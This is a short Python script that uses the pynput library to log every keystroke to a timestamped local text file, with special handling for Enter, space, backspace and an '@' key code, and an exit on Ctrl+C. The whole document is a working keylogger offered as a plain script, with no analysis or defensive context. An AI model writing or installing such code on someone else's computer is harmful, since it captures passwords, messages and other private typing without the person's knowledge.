import datetime
from pynput.keyboard import Listener

date = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
f = open(f"keylog_{date}.txt", "w")

def key_recorder(key):
    key = str(key)

    if key == "'\\x03'":  # if press Ctrl + C
        f.close()
        quit()
    if key == "Key.enter":
        f.write("\n")
    elif key == "Key.space":
        f.write(" ")
    elif key == "Key.backspace":
        f.write("%Backspace%")
    elif key == "<65027>":
        f.write("@")
    else:
        f.write(key.replace("'", ""))

with Listener(on_press=key_recorder) as l:
    l.join()
